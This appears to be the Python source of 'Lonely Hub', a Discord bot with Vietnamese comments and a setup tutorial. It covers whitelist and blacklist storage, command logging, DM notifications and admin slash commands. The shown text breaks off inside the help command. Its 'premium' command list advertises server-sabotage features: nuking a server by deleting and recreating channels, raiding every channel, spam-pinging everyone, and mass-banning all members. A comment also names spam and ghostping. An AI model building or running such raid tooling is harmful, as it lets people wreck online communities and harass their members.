# ========================================Tutorial==========================================#
#                                                                                                                                                                                                 #
#                                                               Cach cai bot tu A - Z by LongHip12                                                                    #
#                                                               B1: Tai Vscode tai https://code.visualstudio.com                                           #
#                                                               B2: Tai Python tai https://python.org                                                                 #
#                                                               B3: Tai Extension Duoi day:                                                                                 #
#                                                               Python by Microsoft,Jupyter,Path Intellisense,vscodeicon (tuy chon)         #
#                                                               B5: tai package duoi day:                                                                                    #
#                                                               pip install -U discord.py pytz art colorama flask                                                 #
#                                                               Invite: https://pastefy.app/OA5O3MX3                                                           #
#                                                                                                                                                                                             #
# ========================================Code===========================================

import discord
from discord.ext import commands
from discord import app_commands
from art import *
import datetime
import os
import asyncio
import pytz
import json
from colorama import Fore, Style, init
init(autoreset=True)
import itertools
from flask import Flask
import threading

app = Flask(__name__)

@app.route("/")
def home():
    return "Bot ƒëang ch·∫°y!"

def run_web():
    app.run(host="0.0.0.0", port=8080)

# Ch·∫°y Flask song song
threading.Thread(target=run_web).start()

# M√†u rainbow chroma
colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA]

ascii_art = r"""
 _                          _          ____          _
| |      ___   _ __    ___ | | _   _  | __ )   ___  | |_
| |     / _ \ | '_ \  / _ \| || | | | |  _ \  / _ \ | __|
| |___ | (_) || | | ||  __/| || |_| | | |_) || (_) || |_
|_____| \___/ |_| |_| \___||_| \__, | |____/  \___/  \__|
                               |___/
"""

def print_chroma(text):
    cycle_colors = itertools.cycle(colors)
    result = ""
    for char in text:
        if char.strip():  # c√≥ k√Ω t·ª±
            result += next(cycle_colors) + char + Style.RESET_ALL
        else:  # gi·ªØ kho·∫£ng tr·∫Øng
            result += char
    print(result)

print_chroma(ascii_art)
print(Fore.GREEN + "=" * 67)

# Th∆∞ m·ª•c d·ªØ li·ªáu (relative t·ªõi file main.py)
BASE_DIR = os.path.dirname(os.path.abspath(__file__))   # th∆∞ m·ª•c ch·ª©a main.py
DATA_DIR = os.path.join(BASE_DIR, "Bot_Data")

# T√™n file
WHITELIST_FILE = os.path.join(DATA_DIR, "whitelist_users.json")
BANNED_FILE    = os.path.join(DATA_DIR, "blacklist_users.json")

# Bi·∫øn to√†n c·ª•c
ALLOWED_USERS = {}
BANNED_USERS = {}

# T·∫°o folder n·∫øu ch∆∞a t·ªìn t·∫°i
os.makedirs(DATA_DIR, exist_ok=True)

# N·∫øu file ch∆∞a c√≥, kh·ªüi t·∫°o file r·ªóng
for p in (WHITELIST_FILE, BANNED_FILE):
    if not os.path.exists(p):
        try:
            with open(p, "w", encoding="utf-8") as f:
                json.dump({}, f, ensure_ascii=False, indent=4)
        except Exception as e:
            print(f"[ERROR] Kh√¥ng th·ªÉ t·∫°o file {p}: {e}")
# H√†m load/save cho whitelist
def save_whitelist():
    try:
        with open(WHITELIST_FILE, "w", encoding="utf-8") as f:
            # l∆∞u key d∆∞·ªõi d·∫°ng string ƒë·ªÉ JSON h·ª£p l·ªá
            json.dump({str(k): v for k, v in ALLOWED_USERS.items()}, f, ensure_ascii=False, indent=4)
    except Exception as e:
        print(f"[ERROR] Kh√¥ng th·ªÉ l∆∞u {WHITELIST_FILE}: {e}")

def load_whitelist():
    global ALLOWED_USERS
    try:
        with open(WHITELIST_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
        # chuy·ªÉn key v·ªÅ int n·∫øu c√≥ th·ªÉ
        ALLOWED_USERS = {}
        for k, v in data.items():
            try:
                ALLOWED_USERS[int(k)] = v
            except Exception:
                ALLOWED_USERS[k] = v
    except Exception as e:
        print(f"[ERROR] Kh√¥ng th·ªÉ ƒë·ªçc {WHITELIST_FILE}: {e}")
        ALLOWED_USERS = {}

# H√†m load/save cho blacklist
def save_banned_users():
    try:
        with open(BANNED_FILE, "w", encoding="utf-8") as f:
            json.dump({str(k): v for k, v in BANNED_USERS.items()}, f, ensure_ascii=False, indent=4)
    except Exception as e:
        print(f"[ERROR] Kh√¥ng th·ªÉ l∆∞u {BANNED_FILE}: {e}")

def load_banned_users():
    global BANNED_USERS
    try:
        with open(BANNED_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
        BANNED_USERS = {}
        for k, v in data.items():
            try:
                BANNED_USERS[int(k)] = v
            except Exception:
                BANNED_USERS[k] = v
    except Exception as e:
        print(f"[ERROR] Kh√¥ng th·ªÉ ƒë·ªçc {BANNED_FILE}: {e}")
        BANNED_USERS = {}
        
# C·∫•u h√¨nh bot
intents = discord.Intents.default()
intents.message_content = True
intents.members = True
bot = commands.Bot(command_prefix=['!', '?', '.', '/'], intents=intents)

# URLs
ICON_URL = "https://i.imgur.com/TWW22k4.jpeg"
FOOTER_ICON_URL = "https://i.imgur.com/TWW22k4.jpeg"
BANNER_URL = ""

# Thi·∫øt l·∫≠p m√∫i gi·ªù UTC+7
UTC7 = pytz.timezone('Asia/Bangkok')  # Bangkok l√† UTC+7

# GUILD ID b·ªã c·∫•m s·ª≠ d·ª•ng spam v√† ghostping
RESTRICTED_GUILD_ID = 1409783780217983029

def is_user_allowed(user_id):
    """Ki·ªÉm tra xem user c√≥ ƒë∆∞·ª£c ph√©p s·ª≠ d·ª•ng l·ªánh ƒë·∫∑c bi·ªát kh√¥ng"""
    return user_id in ALLOWED_USERS

def is_user_banned(user_id):
    """Ki·ªÉm tra xem user c√≥ b·ªã c·∫•m s·ª≠ d·ª•ng bot kh√¥ng"""
    return user_id in BANNED_USERS

def get_banned_users_table():
    """Hi·ªÉn th·ªã danh s√°ch user b·ªã ban (mobile-friendly)"""
    if not BANNED_USERS:
        return (
            "```\nüìã Danh s√°ch ng∆∞·ªùi d√πng b·ªã c·∫•m:\n"
            "--------------------------------\n"
            "Kh√¥ng c√≥ ng∆∞·ªùi d√πng n√†o b·ªã c·∫•m\n"
            "--------------------------------\n```"
        )
    
    table = "```\nüìã Danh s√°ch ng∆∞·ªùi d√πng b·ªã c·∫•m:\n"
    table += "-" * 23 + "\n"
    for user_id, ban_info in BANNED_USERS.items():
        # Ph√≤ng khi ban_info kh√¥ng ƒë·ªß key
        reason = ban_info.get("reason", "Kh√¥ng r√µ")
        banned_by = ban_info.get("banned_by", "Kh√¥ng r√µ")
        banned_at = ban_info.get("banned_at", "Kh√¥ng r√µ")

        table += f"üë§ User ID : {user_id}\n"
        table += f"üìù L√Ω do   : {reason}\n"
        table += f"üõ°Ô∏è B·ªüi    : {banned_by}\n"
        table += f"‚è∞ Th·ªùi gian: {banned_at}\n"
        table += "-" * 23 + "\n"
    table += f"T·ªïng s·ªë: {len(BANNED_USERS)} user b·ªã c·∫•m\n```"
    return table

def get_allowed_users_table():
    """ƒê·ªçc tr·ª±c ti·∫øp t·ª´ whitelist.json v√† tr·∫£ v·ªÅ b·∫£ng user (mobile-friendly)."""
    if not os.path.exists(WHITELIST_FILE):
        return "‚ö†Ô∏è Hi·ªán ch∆∞a c√≥ user n√†o trong whitelist."

    try:
        with open(WHITELIST_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
    except Exception as e:
        return f"‚ö†Ô∏è L·ªói khi ƒë·ªçc whitelist.json: {e}"

    if not data:
        return "‚ö†Ô∏è Hi·ªán ch∆∞a c√≥ user n√†o trong whitelist."

    table = "```\nDanh s√°ch user whitelist:\n"
    table += "-" * 31 + "\n"
    for user_id, user_name in data.items():
        table += f"T√™n: {user_name}\n"
        table += f"ID : {user_id}\n"
        table += "-" * 31 + "\n"
    table += f"T·ªïng s·ªë: {len(data)} user ƒë∆∞·ª£c c·∫•p quy·ªÅn admin\n```"
    return table

def setup_logging():
    """T·∫°o th∆∞ m·ª•c logs n·∫øu ch∆∞a t·ªìn t·∫°i"""
    if not os.path.exists('Logs'):
        os.makedirs('Logs')

def get_utc7_time():
    """L·∫•y th·ªùi gian hi·ªán t·∫°i theo UTC+7"""
    now = datetime.datetime.now(UTC7)
    return now
    
# Th√™m v√†o ƒë·∫ßu file (sau setup_logging / get_utc7_time)
def log(message: str):
    """H√†m log ƒë∆°n gi·∫£n ‚Äî in console v√† ghi file h√†ng ng√†y."""
    now = get_utc7_time()
    timestamp = now.strftime("[%H:%M:%S | %d/%m/%Y]")
    log_message = f"{timestamp} {message}"
    try:
        print(log_message)
        log_filename = now.strftime("Logs/command_log_%d-%m-%Y.txt")
        with open(log_filename, 'a', encoding='utf-8') as f:
            f.write(log_message + '\n')
    except Exception as e:
        # Kh√¥ng n√©m l·ªói t·ª´ h√†m log ƒë·ªÉ tr√°nh ph√° flow ch√≠nh
        print(f"[LOG ERROR] {e}")

def log_command(user, command_name, guild_name, command_type="Text Command"):
    """Ghi log v√†o file v√† console"""
    # L·∫•y th·ªùi gian hi·ªán t·∫°i theo UTC+7
    now = get_utc7_time()
    timestamp = now.strftime("[%H:%M:%S | %d/%m/%Y]")
    
    # Format log message
    log_message = f"{timestamp} {user}: {command_name} ({guild_name}) [{command_type}]"
    
    # Ghi v√†o console
    print(log_message)
    
    # Ghi v√†o file (theo ng√†y)
    log_filename = now.strftime("Logs/command_log_%d-%m-%Y.txt")
    with open(log_filename, 'a', encoding='utf-8') as log_file:
        log_file.write(log_message + '\n')
    
    return log_message

async def send_dm_notification(user, command_name, guild_name, command_type):
    """G·ª≠i th√¥ng b√°o ƒë·∫øn DM d·∫°ng Embed cho t·∫•t c·∫£ user ƒë∆∞·ª£c ph√©p"""
    current_time = get_utc7_time()
    time_str = current_time.strftime("%H:%M:%S %d/%m/%Y")
    
    for user_id in ALLOWED_USERS.keys():
        try:
            user_obj = await bot.fetch_user(user_id)
            
            embed = discord.Embed(
                title="Lonely Hub Notification",
                color=discord.Color.blue(),
                timestamp=current_time
            )
            
            # Set author v·ªõi icon
            embed.set_author(
                name="Lonely Hub Command Log",
                icon_url=ICON_URL
            )
            
            # Th√™m c√°c field theo format y√™u c·∫ßu
            embed.add_field(
                name="[ü§ñ] Command:",
                value=f"```{command_name}```",
                inline=False
            )
            
            embed.add_field(
                name="[üë§] User:",
                value=f"```{user}```",
                inline=True
            )
            
            embed.add_field(
                name="[üè†] Server:",
                value=f"```{guild_name}```",
                inline=True
            )
            
            embed.add_field(
                name="[üìù] Type:",
                value=f"```{command_type}```",
                inline=True
            )
            
            embed.add_field(
                name="[üïê] Command Run Time:",
                value=f"```{time_str} (UTC+7)```",
                inline=False
            )
            
            # Set footer v·ªõi icon
            embed.set_footer(
                text=f"Lonely Hub | {time_str}",
                icon_url=FOOTER_ICON_URL
            )
            
            # Set thumbnail
            embed.set_thumbnail(url=ICON_URL)
            
            await user_obj.send(embed=embed)
            
        except Exception as e:
            print(f"Kh√¥ng th·ªÉ g·ª≠i DM cho user {user_id}: {e}")

@bot.event
async def on_ready():
    # Load d·ªØ li·ªáu whitelist v√† blacklist t·ª´ file
    load_whitelist()
    load_banned_users()
    
    # In ra tr·∫°ng th√°i bot
    print(f"{Fore.CYAN}[Info]{Style.RESET_ALL} {Fore.GREEN}{bot.user}{Style.RESET_ALL} ƒë√£ k·∫øt n·ªëi th√†nh c√¥ng!")
    print(f"{Fore.CYAN}[Info]{Style.RESET_ALL} M√∫i gi·ªù: {Fore.YELLOW}UTC+7{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[Info]{Style.RESET_ALL} ƒê√£ load {Fore.BLUE}{len(ALLOWED_USERS)}{Style.RESET_ALL} user whitelist")
    print(f"{Fore.CYAN}[Info]{Style.RESET_ALL} ƒê√£ load {Fore.RED}{len(BANNED_USERS)}{Style.RESET_ALL} user b·ªã c·∫•m")
    
    try:
        synced = await bot.tree.sync()
        print(f"{Fore.CYAN}[Info]{Style.RESET_ALL} ƒê√£ ƒë·ªìng b·ªô {Fore.YELLOW}{len(synced)}{Style.RESET_ALL} slash command(s)")
        print("=" * 31 + "Console" + "=" * 29)
    except Exception as e:
        print(f"{Fore.RED}[Error]L·ªói ƒë·ªìng b·ªô slash commands: {Fore.YELLOW}{e}{Style.RESET_ALL}")
    
# ==================== C√ÅC L·ªÜNH M·ªöI: BAN/UNBAN/WHITELIST ====================

# Slash Command - Bancmd: C·∫•m ng∆∞·ªùi d√πng s·ª≠ d·ª•ng bot
@bot.tree.command(name="bancmd", description="C·∫•m ng∆∞·ªùi d√πng s·ª≠ d·ª•ng bot")
@app_commands.describe(user_id="ID c·ªßa ng∆∞·ªùi d√πng c·∫ßn c·∫•m", reason="L√Ω do c·∫•m")
async def bancmd(interaction: discord.Interaction, user_id: str, reason: str):
    if not is_user_allowed(interaction.user.id):
        await interaction.response.send_message(
            embed=discord.Embed(title="‚ùå L·ªói", description="B·∫°n kh√¥ng c√≥ quy·ªÅn!", color=discord.Color.red()),
            ephemeral=True
        )
        return

    try:
        target_user_id = int(user_id)
        if target_user_id == interaction.user.id:
            await interaction.response.send_message(
                embed=discord.Embed(title="‚ùå L·ªói", description="Kh√¥ng th·ªÉ t·ª± c·∫•m ch√≠nh m√¨nh!", color=discord.Color.red()),
                ephemeral=True
            )
            return

        if target_user_id in ALLOWED_USERS:
            await interaction.response.send_message(
                embed=discord.Embed(title="‚ùå L·ªói", description="Kh√¥ng th·ªÉ c·∫•m admin kh√°c!", color=discord.Color.red()),
                ephemeral=True
            )
            return

        if is_user_banned(target_user_id):
            await interaction.response.send_message(
                embed=discord.Embed(title="‚ùå L·ªói", description="User ƒë√£ b·ªã c·∫•m tr∆∞·ªõc ƒë√≥!", color=discord.Color.red()),
                ephemeral=True
            )
            return

        # th√™m v√†o danh s√°ch c·∫•m
        current_time = get_utc7_time().strftime("%H:%M:%S %d/%m/%Y")
        BANNED_USERS[target_user_id] = {
            "reason": reason,
            "banned_by": f"{interaction.user}",
            "banned_at": current_time
        }
        save_banned_users()  # üî• L∆∞u l·∫°i

        # tr·∫£ l·ªùi ngay
        await interaction.response.send_message(
            embed=discord.Embed(
                title="‚úÖ ƒê√£ c·∫•m",
                description=f"ƒê√£ c·∫•m user `{user_id}`.\n**L√Ω do:** {reason}",
                color=discord.Color.green()
            ),
            ephemeral=True
        )

        # log + dm sau khi ƒë√£ tr·∫£ l·ªùi
        user = f"{interaction.user}"
        guild_name = interaction.guild.name if interaction.guild else "Direct Message"
        log_command(user, f"/bancmd userid:{user_id} reason:{reason}", guild_name, "Slash Command")
        await send_dm_notification(user, f"/bancmd userid:{user_id} reason:{reason}", guild_name, "Slash Command")

    except ValueError:
        await interaction.response.send_message(
            embed=discord.Embed(title="‚ùå L·ªói", description="User ID kh√¥ng h·ª£p l·ªá!", color=discord.Color.red()),
            ephemeral=True
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
    except Exception as e:
        error_embed = discord.Embed(
            title="‚ùå L·ªói kh√¥ng x√°c ƒë·ªãnh",
            description=f"ƒê√£ x·∫£y ra l·ªói: {str(e)}",
            color=discord.Color.red()
        )
        await interaction.response.send_message(embed=error_embed, ephemeral=True)

# Slash Command - Unbancmd: G·ª° c·∫•m ng∆∞·ªùi d√πng
@bot.tree.command(name="unbancmd", description="G·ª° c·∫•m ng∆∞·ªùi d√πng s·ª≠ d·ª•ng bot")
@app_commands.describe(
    user_id="ID c·ªßa ng∆∞·ªùi d√πng c·∫ßn g·ª° c·∫•m",
    reason="L√Ω do g·ª° c·∫•m"
)
async def unbancmd(interaction: discord.Interaction, user_id: str, reason: str):
    """Slash command g·ª° c·∫•m ng∆∞·ªùi d√πng s·ª≠ d·ª•ng bot"""
    # Ki·ªÉm tra quy·ªÅn admin
    if not is_user_allowed(interaction.user.id):
        embed = discord.Embed(
            title="‚ùå L·ªói",
            description="B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y!",
            color=discord.Color.red()
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    try:
        # Chuy·ªÉn ƒë·ªïi user_id sang integer
        target_user_id = int(user_id)
        
        # Ki·ªÉm tra xem user c√≥ b·ªã c·∫•m kh√¥ng
        if not is_user_banned(target_user_id):
            embed = discord.Embed(
                title="‚ùå L·ªói",
                description="Ng∆∞·ªùi d√πng n√†y kh√¥ng b·ªã c·∫•m!",
                color=discord.Color.red()
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        
        # X√≥a kh·ªèi danh s√°ch c·∫•m + l∆∞u file JSON
        del BANNED_USERS[target_user_id]
        save_banned_users()  # üî• th√™m d√≤ng n√†y ƒë·ªÉ persist sau restart
        
        # Th√¥ng b√°o th√†nh c√¥ng (‚ö° tr·∫£ l·ªùi tr∆∞·ªõc)
        embed = discord.Embed(
            title="‚úÖ ƒê√£ g·ª° c·∫•m ng∆∞·ªùi d√πng",
            description=f"ƒê√£ g·ª° c·∫•m ng∆∞·ªùi d√πng v·ªõi ID {user_id}.\n**L√Ω do:** {reason}",
            color=discord.Color.green()
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)

        # Sau khi tr·∫£ l·ªùi xong m·ªõi log + g·ª≠i DM
        user = f"{interaction.user.name}#{interaction.user.discriminator}"
        guild_name = interaction.guild.name if interaction.guild else "Direct Message"
        log_command(user, f"/unbancmd userid:{user_id} reason:{reason}", guild_name, "Slash Command")
        await send_dm_notification(user, f"/unbancmd userid:{user_id} reason:{reason}", guild_name, "Slash Command")
        
    except ValueError:
        embed = discord.Embed(
            title="‚ùå L·ªói",
            description="User ID kh√¥ng h·ª£p l·ªá! Vui l√≤ng nh·∫≠p ID ƒë√∫ng ƒë·ªãnh d·∫°ng s·ªë.",
            color=discord.Color.red()
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
    except Exception as e:
        error_embed = discord.Embed(
            title="‚ùå L·ªói kh√¥ng x√°c ƒë·ªãnh",
            description=f"ƒê√£ x·∫£y ra l·ªói: {str(e)}",
            color=discord.Color.red()
        )
        await interaction.response.send_message(embed=error_embed, ephemeral=True)
        
# Slash Command - Bancmdlist: Hi·ªÉn th·ªã danh s√°ch ng∆∞·ªùi d√πng b·ªã c·∫•m
@bot.tree.command(name="bancmdlist", description="Hi·ªÉn th·ªã danh s√°ch ng∆∞·ªùi d√πng b·ªã c·∫•m s·ª≠ d·ª•ng bot")
async def bancmdlist(interaction: discord.Interaction):
    """Slash command hi·ªÉn th·ªã danh s√°ch ng∆∞·ªùi d√πng b·ªã c·∫•m"""
    # Ki·ªÉm tra quy·ªÅn admin
    if not is_user_allowed(interaction.user.id):
        embed = discord.Embed(
            title="‚ùå L·ªói",
            description="B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y!",
            color=discord.Color.red()
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    current_time = get_utc7_time()
    
    embed = discord.Embed(
        title="üî® Danh s√°ch ng∆∞·ªùi d√πng b·ªã c·∫•m",
        description=get_banned_users_table(),
        color=discord.Color.orange(),
        timestamp=current_time
    )
    
    embed.set_author(name="Lonely Hub", icon_url=ICON_URL)
    embed.set_footer(text=f"Lonely Hub | {current_time.strftime('%H:%M:%S %d/%m/%Y')}", icon_url=FOOTER_ICON_URL)
    embed.set_thumbnail(url=ICON_URL)
    
    # ‚ö° Ph·∫£n h·ªìi tr∆∞·ªõc
    await interaction.response.send_message(embed=embed, ephemeral=True)

    # üìå Log + g·ª≠i DM sau khi ƒë√£ ph·∫£n h·ªìi
    user = f"{interaction.user.name}#{interaction.user.discriminator}"
    guild_name = interaction.guild.name if interaction.guild else "Direct Message"
    log_command(user, "/bancmdlist", guild_name, "Slash Command")
    await send_dm_notification(user, "/bancmdlist", guild_name, "Slash Command")
    
# Slash Command - Addwhitelist: Th√™m ng∆∞·ªùi d√πng v√†o whitelist
@bot.tree.command(name="addwhitelist", description="Th√™m ng∆∞·ªùi d√πng v√†o danh s√°ch ƒë∆∞·ª£c ph√©p s·ª≠ d·ª•ng bot")
@app_commands.describe(
    user_id="ID c·ªßa ng∆∞·ªùi d√πng c·∫ßn th√™m",
    display_name="T√™n hi·ªÉn th·ªã c·ªßa ng∆∞·ªùi d√πng"
)
async def addwhitelist(interaction: discord.Interaction, user_id: str, display_name: str):
    """Slash command th√™m ng∆∞·ªùi d√πng v√†o whitelist"""
    # Ki·ªÉm tra quy·ªÅn admin
    if not is_user_allowed(interaction.user.id):
        embed = discord.Embed(
            title="‚ùå L·ªói",
            description="B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y!",
            color=discord.Color.red()
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    try:
        # Chuy·ªÉn ƒë·ªïi user_id sang integer
        target_user_id = int(user_id)
        
        # Ki·ªÉm tra xem user ƒë√£ c√≥ trong whitelist ch∆∞a
        if target_user_id in ALLOWED_USERS:
            embed = discord.Embed(
                title="‚ùå L·ªói",
                description="Ng∆∞·ªùi d√πng n√†y ƒë√£ c√≥ trong whitelist!",
                color=discord.Color.red()
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        
        # ‚úÖ Th√™m v√†o whitelist v√† l∆∞u JSON
        ALLOWED_USERS[target_user_id] = display_name
        save_whitelist()  # üî• l∆∞u l·∫°i ngay v√†o whitelist.json
        
        # ‚ö° Ph·∫£n h·ªìi th√†nh c√¥ng tr∆∞·ªõc
        embed = discord.Embed(
            title="‚úÖ ƒê√£ th√™m v√†o whitelist",
            description=f"ƒê√£ th√™m ng∆∞·ªùi d√πng {display_name} (ID: {user_id}) v√†o whitelist.",
            color=discord.Color.green()
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)

        # üìå Sau khi ph·∫£n h·ªìi m·ªõi log + DM
        user = f"{interaction.user.name}#{interaction.user.discriminator}"
        guild_name = interaction.guild.name if interaction.guild else "Direct Message"
        log_command(user, f"/addwhitelist userid:{user_id} name:{display_name}", guild_name, "Slash Command")
        await send_dm_notification(user, f"/addwhitelist userid:{user_id} name:{display_name}", guild_name, "Slash Command")
        
    except ValueError:
        embed = discord.Embed(
            title="‚ùå L·ªói",
            description="User ID kh√¥ng h·ª£p l·ªá! Vui l√≤ng nh·∫≠p ID ƒë√∫ng ƒë·ªãnh d·∫°ng s·ªë.",
            color=discord.Color.red()
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
    except Exception as e:
        error_embed = discord.Embed(
            title="‚ùå L·ªói kh√¥ng x√°c ƒë·ªãnh",
            description=f"ƒê√£ x·∫£y ra l·ªói: {str(e)}",
            color=discord.Color.red()
        )
        await interaction.response.send_message(embed=error_embed, ephemeral=True)
        
# Slash Command - Removewhitelist: X√≥a ng∆∞·ªùi d√πng kh·ªèi whitelist
@bot.tree.command(name="removewhitelist", description="X√≥a ng∆∞·ªùi d√πng kh·ªèi danh s√°ch ƒë∆∞·ª£c ph√©p s·ª≠ d·ª•ng bot")
@app_commands.describe(
    user_id="ID c·ªßa ng∆∞·ªùi d√πng c·∫ßn x√≥a"
)
async def removewhitelist(interaction: discord.Interaction, user_id: str):
    """Slash command x√≥a ng∆∞·ªùi d√πng kh·ªèi whitelist"""
    # Ki·ªÉm tra quy·ªÅn admin
    if not is_user_allowed(interaction.user.id):
        embed = discord.Embed(
            title="‚ùå L·ªói",
            description="B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y!",
            color=discord.Color.red()
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    try:
        # Chuy·ªÉn ƒë·ªïi user_id sang integer
        target_user_id = int(user_id)
        
        # Ki·ªÉm tra xem user c√≥ trong whitelist kh√¥ng
        if target_user_id not in ALLOWED_USERS:
            embed = discord.Embed(
                title="‚ùå L·ªói",
                description="Ng∆∞·ªùi d√πng n√†y kh√¥ng c√≥ trong whitelist!",
                color=discord.Color.red()
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        
        # X√≥a kh·ªèi whitelist + l∆∞u l·∫°i JSON
        removed_user = ALLOWED_USERS.pop(target_user_id)
        save_whitelist()  # üî• l∆∞u whitelist.json ngay sau khi xo√°
        
        # ‚ö° Tr·∫£ l·ªùi th√†nh c√¥ng tr∆∞·ªõc
        embed = discord.Embed(
            title="‚úÖ ƒê√£ x√≥a kh·ªèi whitelist",
            description=f"ƒê√£ x√≥a ng∆∞·ªùi d√πng {removed_user} (ID: {user_id}) kh·ªèi whitelist.",
            color=discord.Color.green()
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)

        # üìå Sau khi ph·∫£n h·ªìi, m·ªõi log + DM
        user = f"{interaction.user.name}#{interaction.user.discriminator}"
        guild_name = interaction.guild.name if interaction.guild else "Direct Message"
        log_command(user, f"/removewhitelist userid:{user_id}", guild_name, "Slash Command")
        await send_dm_notification(user, f"/removewhitelist userid:{user_id}", guild_name, "Slash Command")
        
    except ValueError:
        embed = discord.Embed(
            title="‚ùå L·ªói",
            description="User ID kh√¥ng h·ª£p l·ªá! Vui l√≤ng nh·∫≠p ID ƒë√∫ng ƒë·ªãnh d·∫°ng s·ªë.",
            color=discord.Color.red()
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
    except Exception as e:
        error_embed = discord.Embed(
            title="‚ùå L·ªói kh√¥ng x√°c ƒë·ªãnh",
            description=f"ƒê√£ x·∫£y ra l·ªói: {str(e)}",
            color=discord.Color.red()
        )
        await interaction.response.send_message(embed=error_embed, ephemeral=True)
        
# Slash Command - Premium Commands (Admin only)
@bot.tree.command(name="premium_command", description="Hi·ªÉn th·ªã c√°c l·ªánh premium ch·ªâ d√†nh cho admin")
async def premium_command(interaction: discord.Interaction):
    """Slash command hi·ªÉn th·ªã c√°c l·ªánh premium"""
    # Ki·ªÉm tra quy·ªÅn
    if not is_user_allowed(interaction.user.id):
        embed = discord.Embed(
            title="‚ùå L·ªói",
            description="B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y!",
            color=discord.Color.red()
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return

    current_time = get_utc7_time()
    embed = discord.Embed(
        title="Premium Commands",
        description="List of available premium command",
        color=0x00ffaa,
        timestamp=current_time
    )
    embed.set_author(name="Lonely Hub Bot", icon_url=ICON_URL)

    embed.add_field(
        name="**?nukeall**",
        value="Nuke the server with ping everyone\n\n**Requirements:** Bot must have permission to create, delete channels, rename servers and ping everyone",
        inline=False
    )
    embed.add_field(
        name="**?raidall**",
        value="Raid all channel with ping everyone and message.\n\n**Requirements:** Bot must have permission to ping everyone.",
        inline=False
    )
    embed.add_field(name="**?spampingall**", value="Spam ping everyone all channels", inline=False)
    embed.add_field(
        name="**?banalluser**",
        value="Ban all user with ultra-speed\n\n**Requirements:** The bot needs to have the highest role in the server.",
        inline=False
    )
    embed.add_field(
        name="**?purge [quantity]**",
        value="X√≥a s·ªë l∆∞·ª£ng tin nh·∫Øn ƒë∆∞·ª£c ch·ªâ ƒë·ªãnh\n\n**Requirements:** Bot must have permission to manage messages.",
        inline=False
    )
    embed.add_field(
        name="**?purgeallwebhook**",
        value="X√≥a t·∫•t c·∫£ webhook trong server\n\n**Requirements:** Bot must have permission to manage webhooks.",
        inline=False
    )

    embed.set_footer(text="Lonely Hub Bot", icon_url=FOOTER_ICON_URL)
    embed.set_thumbnail(url=ICON_URL)

    # ‚ö° tr·∫£ l·ªùi ngay tr∆∞·ªõc (ephemeral ƒë·ªÉ ch·ªâ ng∆∞·ªùi g·ªçi th·∫•y)
    await interaction.response.send_message(embed=embed, ephemeral=True)

    # üìå log + g·ª≠i DM ch·∫°y sau khi ƒë√£ ph·∫£n h·ªìi
    user = f"{interaction.user.name}#{interaction.user.discriminator}"
    guild_name = interaction.guild.name if interaction.guild else "Direct Message"
    log_command(user, "/premium_command", guild_name, "Slash Command")
    await send_dm_notification(user, "/premium_command", guild_name, "Slash Command")
# Slash Command - Help
@bot.tree.command(name="help", description="Hi·ªÉn th·ªã t·∫•t c·∫£ l·ªánh c√≥ s·∫µn trong bot")
async def help_command(interaction: discord.Interaction):
    """Slash command hi·ªÉn th·ªã tr·ª£ gi√∫p"""
    # Ki·ªÉm tra xem user c√≥ b·ªã c·∫•m kh√¥ng
    if is_user_banned(interaction.user.id):
        embed = discord.Embed(
            title="‚ùå B·ªã c·∫•m",
            description="B·∫°n ƒë√£ b·ªã c·∫•m s·ª≠ d·ª•ng bot n√†y!",
            color=discord.Color.red()
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    current_time = get_utc7_time()
    user = f"{interaction.user.name}#{interaction.user.discriminator}"
    guild_name = interaction.guild.name if interaction.guild else "Direct Message"

    embed = discord.Embed(
        title="ü§ñ Lonely Hub - H·ªá Th·ªëng L·ªánh",
        description="Xin ch√†o! ƒê√¢y l√† danh s√°ch ƒë·∫ßy ƒë·ªß c√°c l·ªánh c√≥ trong bot.\n\n**üìä Th√¥ng tin bot:**\n‚Ä¢ Prefix: `!`, `?`, `.`, `/`\n‚Ä¢ M√∫i gi·ªù: `UTC+7`\n‚Ä¢ Phi√™n b·∫£n: `1.0.0`",
        color=0x00ffaa,
        timestamp=current_time
    )
    
    # Th√™m c√°c l·ªánh c∆° b·∫£n
    embed.add_field(
        name="üîß L·ªÜNH C∆† B·∫¢N",
        value=(
            "‚Ä¢ `/ping` - Ki·ªÉm tra ƒë·ªô tr·ªÖ c·ªßa bot\n"
            "‚Ä¢ `/info` - Xem th√¥ng tin v·ªÅ bot\n"
            "‚Ä¢ `/time` - Xem gi·ªù hi·ªán t·∫°i UTC+7\n"
            "‚Ä¢ `/users` - Xem danh s√°ch user ƒë∆∞·ª£c ph√©p\n"
            "‚Ä¢ `/help` - Hi·ªÉn th·ªã tr·ª£ gi√∫p n√†y\n"
            "‚Ä¢ `/say` - L√†m bot n√≥i g√¨ ƒë√≥"
        ),
        inline=False
    )
    
    # C√°c l·ªánh admin
    admin_commands = (
